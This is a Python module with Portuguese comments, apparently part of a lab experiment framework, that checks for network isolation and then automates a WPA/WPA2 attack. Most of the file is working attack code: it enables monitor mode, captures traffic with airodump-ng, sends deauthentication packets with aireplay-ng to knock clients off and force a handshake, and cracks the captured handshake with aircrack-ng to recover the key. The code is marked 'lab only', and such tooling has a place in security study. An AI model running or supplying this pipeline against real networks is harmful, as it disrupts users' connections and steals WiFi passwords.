"""
Gestor de Rede
Verifica isolamento e captura tráfego WiFi
"""

import subprocess
import logging
from typing import Dict
from pathlib import Path


class NetworkManager:
    """Gestor de operações de rede"""
    
    def __init__(self, config: Dict, logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.wifi_config = config['experiment'].get('wifi', {})
    
    def verify_isolation(self) -> bool:
        """Verificar se a rede está isolada (sem acesso à Internet)"""
        import platform
        
        self.logger.info("Verificando isolamento de rede...")
        
        # Verificar SO
        if platform.system() == "Windows":
            self.logger.warning("Verificação de isolamento não suportada em Windows")
            return True
        
        # Verificar rotas
        try:
            result = subprocess.run(
                ['ip', 'route'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            routes = result.stdout
            
            # Verificar se existe rota default (Internet)
            if 'default via' in routes:
                self.logger.warning("⚠️  Rota default detectada - rede NÃO isolada!")
                self.logger.warning("Execute: sudo ip route del default")
                return False
            
            self.logger.info("✓ Nenhuma rota default - rede isolada")
            return True
        
        except FileNotFoundError:
            self.logger.warning("Comando 'ip' não encontrado (não é Linux/Unix)")
            return True
        except Exception as e:
            self.logger.error(f"Erro ao verificar rotas: {e}")
            return False
    
    def capture_handshake(self, output_file: Path) -> bool:
        """Capturar handshake WPA/WPA2 (LAB apenas!)"""
        if not self.wifi_config.get('enabled', False):
            self.logger.info("Captura WiFi desabilitada")
            return True
        
        interface = self.wifi_config.get('interface', 'wlan0')
        target_ssid = self.wifi_config.get('target_ssid')
        capture_time = self.wifi_config.get('capture_time', 60)
        
        self.logger.info(f"Capturando handshake: {target_ssid}")
        
        try:
            # 1. Colocar interface em modo monitor
            self.logger.info(f"Ativando modo monitor em {interface}...")
            subprocess.run(['sudo', 'airmon-ng', 'start', interface], check=True)
            
            # Interface normalmente vira wlan0mon
            mon_interface = f"{interface}mon"
            
            # 2. Iniciar captura com airodump-ng
            self.logger.info(f"Capturando em {mon_interface} por {capture_time}s...")
            
            capture_cmd = [
                'sudo', 'airodump-ng',
                '--bssid', self._get_target_bssid(target_ssid),
                '-c', '6',  # Canal
                '-w', str(output_file.with_suffix('')),
                mon_interface
            ]
            
            # Executar captura em background
            capture_proc = subprocess.Popen(
                capture_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Aguardar um pouco
            import time
            time.sleep(5)
            
            # 3. Forçar deauth para obter handshake
            self.logger.info("Enviando pacotes de deauth...")
            deauth_cmd = [
                'sudo', 'aireplay-ng',
                '--deauth', '5',
                '-a', self._get_target_bssid(target_ssid),
                mon_interface
            ]
            
            subprocess.run(deauth_cmd, timeout=10)
            
            # Aguardar captura
            time.sleep(capture_time)
            
            # Terminar captura
            capture_proc.terminate()
            
            # 4. Desativar modo monitor
            subprocess.run(['sudo', 'airmon-ng', 'stop', mon_interface], check=True)
            
            # Verificar se capturou handshake
            if output_file.with_suffix('.cap').exists():
                self.logger.info(f"✓ Handshake capturado: {output_file}")
                return True
            else:
                self.logger.warning("Handshake não capturado")
                return False
        
        except Exception as e:
            self.logger.error(f"Erro na captura: {e}")
            # Garantir que modo monitor é desativado
            try:
                subprocess.run(['sudo', 'airmon-ng', 'stop', f"{interface}mon"])
            except:
                pass
            return False
    
    def _get_target_bssid(self, ssid: str) -> str:
        """Obter BSSID do SSID alvo
        
        NOTA: Esta é uma implementação placeholder.
        Em ambiente LAB, o BSSID deve ser configurado em YAML sob:
        experiment.wifi.target_bssid
        """
        # Tentar obter do config
        target_bssid = self.wifi_config.get('target_bssid')
        if target_bssid:
            return target_bssid
        
        # Fallback (não funciona realmente)
        self.logger.warning(f"BSSID não configurado para SSID: {ssid}")
        self.logger.warning("Configure 'target_bssid' em experiment.wifi no YAML")
        return "00:11:22:33:44:55"
    
    def crack_wpa_handshake(self, capture_file: Path, wordlist: Path) -> Dict:
        """Crackear handshake WPA com aircrack-ng"""
        self.logger.info(f"Crackeando handshake: {capture_file}")
        
        try:
            cmd = [
                'aircrack-ng',
                '-w', str(wordlist),
                str(capture_file)
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Procurar pela chave na saída
            output = result.stdout
            if 'KEY FOUND' in output:
                # Extrair chave
                for line in output.split('\n'):
                    if 'KEY FOUND' in line:
                        key = line.split('[')[-1].split(']')[0].strip()
                        self.logger.info(f"✓ Chave encontrada: {key}")
                        return {'success': True, 'key': key}
            
            self.logger.warning("Chave não encontrada")
            return {'success': False}
        
        except Exception as e:
            self.logger.error(f"Erro no cracking WPA: {e}")
            return {'success': False, 'error': str(e)}
